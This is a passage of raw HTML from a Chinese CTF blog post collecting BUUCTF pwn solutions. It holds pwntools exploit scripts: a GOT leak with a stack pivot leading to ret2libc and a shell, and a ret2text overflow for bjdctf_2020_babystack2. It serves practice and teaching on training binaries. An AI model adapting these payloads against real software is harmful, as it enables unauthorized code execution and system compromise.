</span></span><span class="line"><span class="cl"><span class="n">s_addr</span> <span class="o">=</span> <span class="mh">0x0804A300</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;name?&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span><span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;say?&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="mh">0x18</span><span class="o">*</span><span class="s1">&#39;a&#39;</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">s_addr</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">leave_ret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">write_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">base</span> <span class="o">=</span> <span class="n">write_addr</span> <span class="o">-</span> <span class="n">write_got</span>
</span></span><span class="line"><span class="cl"><span class="n">sys_addr</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">next</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">sys_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;say?&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h3 id="0x1fbjdctf_2020_babystack2" class="heading-element">
  <a href="#0x1fbjdctf_2020_babystack2" class="heading-mark"></a>0x1F.bjdctf_2020_babystack2</h3><p>ret2text</p>
<div class="highlight" id="id-47"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./bjdctf_2020_babystack2&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">backdoor</span> <span class="o">=</span> <span class="mh">0x00400726</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;-1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">backdoor</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div></div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="更新于 2021-06-01 00:00:00">更新于 2021-06-01&nbsp;</span>
      </div><div class="post-info-license">
            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
          </div></div><div class="post-info-line">
        <div class="post-info-md"></div>
        <div class="post-info-share">
          <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://ghostasky.github.io/posts/buu-pwn-0x10-0x1f/" data-title="BUU_PWN刷题_0x10-0x1F" data-hashtags="PWN"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://ghostasky.github.io/posts/buu-pwn-0x10-0x1f/" data-hashtag="PWN"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://ghostasky.github.io/posts/buu-pwn-0x10-0x1f/" data-title="BUU_PWN刷题_0x10-0x1F"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
  </span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/pwn/" class="post-tag" title="标签 - PWN">PWN</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
    </section>
  </div>

  <div class="post-nav"><a href="/posts/buu-web-0x10-0x1f/" class="post-nav-item" rel="prev" title="BUU_WEB刷题_0x10-0x1F"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>BUU_WEB刷题_0x10-0x1F</a>
      <a href="/posts/buu-pwn-0x01-0x0f/" class="post-nav-item" rel="next" title="BUU_PWN刷题_0x01-0x0F">BUU_PWN刷题_0x01-0x0F<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.124.1"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.2"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
              <a href="/"></a></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
        </div></div><div id="mask"></div><noscript>
    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
  </noscript>
</div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script src="/js/theme.min.js" defer></script></body>
</html>
